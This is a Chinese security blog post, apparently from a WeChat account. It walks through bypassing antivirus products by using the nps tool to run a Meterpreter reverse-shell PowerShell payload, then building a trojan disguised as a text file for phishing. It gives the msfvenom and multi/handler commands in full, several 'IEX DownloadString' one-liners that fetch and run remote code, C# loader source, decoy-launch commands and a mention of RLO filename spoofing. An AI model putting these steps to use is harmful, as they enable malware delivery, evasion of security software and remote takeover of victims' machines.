<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-BrIKdihKDYbpiJFb4SdFw)<table><tbody><tr><td width="557" valign="top" height="62"><section><strong>声明：</strong>该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。</section><section>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。</section></td></tr></tbody></table>

**0x01 前言**

2019 年的一篇笔记，最近一直在熬夜追剧，已经很久没写文章了。今天在知识星球里看到 @冷欲老哥发的 “伪造 TXT 免杀木马. pdf”。

对他提出的两个问题进行了测试，并为其提供了一个简单的解决方案，顺便将原来测试过的 “利用 nps 执行 powershell 命令” 方法也一起记录在这里了！  

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8OLVwojnMwsaWCxkG95ziaYeRBNOpurzibVhDPoiarN37KwYCDIiccib0QofOEjZRcRrjprTNC4jjHxA/640?wx_fmt=png)

**问题简述：**

1. 进程迁移

```
set AutoRunScript post/windows/manage/migrate NAME=notepad.exe）；
```

2. 删除自身

```
笔者编程能力有限，暂时无法实现该功能，不过可以在进程迁移后删除该文件
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8OLVwojnMwsaWCxkG95ziaicV6RcwLtTibNIRlEXibnicn4xNrQiczDuPplrNVictDvRc6gdZUicnLzIzpA/640?wx_fmt=png)

**0x02 msfveom 生成 ps1 载荷**

msfvenom 命令生成一个 ps1 的载荷文件放置在 Apache 的 Web 根目录下，然后启动 apache2 服务即可。

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.120 lport=443 -f psh-reflection > /var/www/html/powershell.ps1
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8OLVwojnMwsaWCxkG95ziaJicicoFbh5ewW4ssPKy5e9oibU2SaYfcJMaWpfEMelxEXscJx81WOxcQg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8OLVwojnMwsaWCxkG95zia1icNxqbVng6VWNJMcnVRibibWNBgcCSemqHbuxSvcozMqqrUjlv61QibCg/640?wx_fmt=png)

在装有 360、火绒、电脑管家等安全防护软件的目标主机上直接执行恶意 powershell 命令时会被拦截。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8OLVwojnMwsaWCxkG95ziaYLHKOv0ILvIJvL4ibictZQm11C5btsyrg0w73TXUGBjzCytUUloVsNsg/640?wx_fmt=png)

****0x03 nps 绕过防护执行 ps1 载荷****

nps（https://github.com/Ben0xA/nps）项目是使用 C# 中的 System.Management.Automation 编写的一个 powershell 命令执行程序，不需要依赖于系统的 powershell.exe，具体参数如下：  

```
nps.exe "{powershell single command}"                     //执行单条powershell命令
nps.exe "& {commands; semi-colon; separated}"             //执行多条命令，分号;分隔
nps.exe -encodedcommand {base64_encoded_command}          //执行Base64编码命令
nps.exe -encode "commands to encode to base64"            //编码字符串为Base64
nps.exe -decode {base64_encoded_command}                  //解码Base64为字符串
```

Compiling x86：

```
csc.exe /unsafe /reference:"C:\windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:NPSx86.exe /platform:x86 "nps\*.cs"
```

Compiling x64：

```
csc.exe /unsafe /reference:"C:\windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:NPSx64.exe /platform:x64 "nps\*.cs"
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8OLVwojnMwsaWCxkG95zia4ibkJhUhTwVpeaG8qaicPR8Hs3XpBiagVKn2I0AdmzLzibibKgeE4IApQPQ/640?wx_fmt=png)

执行 powershell payload 时需要设置好以下监听参数，在下图中可以看到已经成功的获取到目标主机 session 会话，而且 360、火绒、电脑管家等安全防护软件也都没有任何拦截和查杀提示。

```
msf5 > use exploit/multi/handler 
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.0.120
msf5 exploit(multi/handler) > set lport 443
msf5 exploit(multi/handler) > set autorunscript post/windows/manage/migrate NAME=notepad.exe
msf5 exploit(multi/handler) > exploit
```

```
NPSx64.exe "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.120/powershell.ps1')"
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8OLVwojnMwsaWCxkG95zia6IuEmTnL9CPiaj89unUbBlNQCm7M2Cnt7P1TCOqaop7cd7xicaStEDNw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8OLVwojnMwsaWCxkG95zia0A8sAeNL4FzfAc9Py9kUVX0PSslsXr2ufKKCTzWB4Y2OTfGqXdRzFg/640?wx_fmt=png)

web_delivery 模块没能绕过安全防护的检测，在执行底层 powershell 时被火绒的系统加固检测到并拦截 “隐藏执行 PowerShell”，使用 nps 的 - encodedcommand 参数也一样被拦截了。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8OLVwojnMwsaWCxkG95ziayEXPZ8N19WkSIzjB1pm3LA1nkpIyjw1Xx1AXmwToCkI19ZiapsBK17g/640?wx_fmt=png)

VS 编译的 nps 在执行的 powershell 命令中带有 - nop -w hidden -c 参数时就会报错：`Error while executing the script.Missing expression after unary operator '-'.`，而 csc.exe 编译的 nps 就不会报错，神马情况我也不知道。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8OLVwojnMwsaWCxkG95ziaYaibET6rdJXzHNH7TocialxQQDReneldNEGHvQyoSez5dkGddrhztbHg/640?wx_fmt=png)

**0x04 nps 的一些问题和解决办法**

**问题描述：  
**

不能直接使用该项目 nps.zip 压缩包中的 nps.exe 执行我们的 powershell 载荷，Windows10、2016 执行后没有反应，Windows2012 执行出现报错（Not PowerShell 已停止工作），Windows2008 执行后卡着不动。

而且还发现一个可疑 TCP 连接：218.93.208.223:8557，不知道这 IP 是从哪冒出来的，不过在 Windows7 上可以执行并能得到 session 会话。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8OLVwojnMwsaWCxkG95ziaGY2UGjaxicGTkAIonaV3NRUdt9Wm78VrlnAEcWHzGncjVial58qQhGKA/640?wx_fmt=png)

**解决办法：  
**

用 VS2012 或 csc.exe 重新编译下源代码，用新编译的 nps.exe 就可以在 Windows7/10/2012/2016 上执行了，不过在 Windows2008 执行时还是会先出现那个可疑 TCP 连接：218.93.208.223:8557，等这个 TCP 连接消失后才能得到 session 会话，很是奇怪！  

```
nps.exe "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.120/powershell.ps1')"
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8OLVwojnMwsaWCxkG95zia92fK4wArPicKstAm8vNI1jrQs0RGy7naWcrYNa6ot5RcuW3PvUhz4zA/640?wx_fmt=png)

**0x05 修改 nps 源码用于社工钓鱼**

@冷欲老哥那篇文章的具体思路是：将重新编译的木马程序伪装成一个正常的 txt，实现的功能是用户双击 exe 后弹出一个 txt 文档（在木马上级目录写入一个 txt 并打开，用来迷惑受害者，后台运行着 Payload），但没能实现进程迁移和自删除功能。  

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8OLVwojnMwsaWCxkG95ziaDSFUzTUzUoic0ysicOFPPKhmREfU36D60r1HwHiciaEkGGTMMx5UqCslKA/640?wx_fmt=png)

这里我先将 nps 源码做了一些简化处理，暂时把无用代码都给删了，直接把我们要执行的 Powershell Payload 留着就行，在重新编译出来后还需要做一些伪装处理，继续往下看...。

```
using System;
using System.Collections.ObjectModel;
using System.Management.Automation;

namespace nps
{
  internal class Program
  {
    private static void Main()
    {
      PowerShell powerShell = PowerShell.Create();
      string script = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.120/powershell.ps1')";
      powerShell.AddScript(script);
      Collection<PSObject> collection = null;
      try
      {
        collection = powerShell.Invoke();
      }
      catch (Exception ex)
      {
        Console.WriteLine("Error while executing the script.\r\n" + ex.Message.ToString());
      }
      if (collection != null)
      {
        foreach (PSObject current in collection)
        {
          Console.WriteLine(current.ToString());
        }
      }
    }
  }
}
```

**不足之处：**

木马程序只修改了图标，在关闭 “隐藏已知文件类型的扩展名” 时可直接看见. EXE 扩展名，并且有明显的 PE 特征，而且在木马文件属性的详细信息中也能看出端倪来。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8OLVwojnMwsaWCxkG95ziatOjfR4tSZYUP4jWeLr5kJocMU52LpNXWOWQaWXG9NwicpkkxnGaxviaw/640?wx_fmt=png)

**思路扩展：**

1.  解决黑框闪退（VS2012 编译前在项目属性的输出类型中选择 “Windows 应用程序” 即可)；
    
2.  写入和打开 TXT（Windows 系统自带程序迷惑受害者，如：记事本、画图、照片查看器等）；
    
3.  显示. EXE 扩展名（可利用 RLO 文件名欺骗技术来解决 “隐藏已知文件类型的扩展名” 问题）；
    

```
记事本：
nps.exe "notepad C:\Windows\Microsoft.NET\Framework\v4.0.30319\ThirdPartyNotices.txt;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.120/powershell.ps1')"

画图：
nps.exe "mspaint C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ASP.NETWebAdminFiles\Images\ASPdotNET_logo.jpg;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.120/powershell.ps1')"

照片查看器：
nps.exe "rundll32 %windir%/system32/shimgvw.dll,ImageView_Fullscreen C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ASP.NETWebAdminFiles\Images\ASPdotNET_logo.jpg;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.120/powershell.ps1')"
```

RLO 文件名欺骗技术已经出来有些年头，所以现在 TIM 和 QQ 都已经禁止传输此类文件了，而且在打开压缩包文件中也都能直接看出来问题了，如下图。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8OLVwojnMwsaWCxkG95ziaTiantsuNo3HOqpMIYuUqUsDuPFS7Hc7DGruEERMRxibDaicVGKib3ZeKJA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8OLVwojnMwsaWCxkG95ziaNZPwmBjXC9EChrz6T9eYSe2PT7PwlBtwlAc301pOVM18RJOGYRKYiaw/640?wx_fmt=png)

**注：**对想到的几个思路进行测试后发现 @冷欲老哥提出的这种利用方式并不适用于社工钓鱼，所以我也就到此为止不再继续往下写了，如果大家有更好的思路和想法，还请不吝赐教，一起讨论学习！![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8OLVwojnMwsaWCxkG95ziaOT8JT6OxkR5eNicU0Uiappia2ibVodHaAiaWvaEQJprAvE5EakRRO3e8BFw/640?wx_fmt=png)

关注公众号回复 “9527” 可免费获取一套 HTB 靶场文档和视频，“1120” 安全参考杂志电子版，“1208” 个人常用高效爆破字典，“0221”2020 年酒仙桥文章打包，“2191”9 月 1 日前潇湘信安所有文章打包。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png) 还在等什么？赶紧点击下方名片关注学习吧！![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png)

公众号

**推 荐 阅 读**

  

  

  

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOec0rlHvusMpuZ14HCT4dZn9ZdY1H6uNgSDcvJmovZibZVy4FV2kEib6nJ9SASN1b4Es56KdPsHWibKg/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247491360&idx=1&sn=e4c3d356b45d7fe821dc2b645f30a595&chksm=cfa6bb33f8d132259884026238db7b79f33da3f3fff2f90a87e4a447118a1be8c4e948031d8f&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcIJDWu9lMmvjKulJ1TxiavKVzyum8jfLVjSYI21rq57uueQafg0LSTCA/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486961&idx=1&sn=d02db4cfe2bdf3027415c76d17375f50&chksm=cfa6a9e2f8d120f4c9e4d8f1a7cd50a1121253cb28cc3222595e268bd869effcbb09658221ec&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf8eyzKWPF5pVok5vsp74xolhlyLt6UPab7jQddW6ywSs7ibSeMAiae8TXWjHyej0rmzO5iaZCYicSgxg/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)

**欢 迎 私 下 骚 扰**

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/XOPdGZ2MYOdSMdwH23ehXbQrbUlOvt6Y0G8fqI9wh7f3J29AHLwmxjIicpxcjiaF2icmzsFu0QYcteUg93sgeWGpA/640?wx_fmt=jpeg)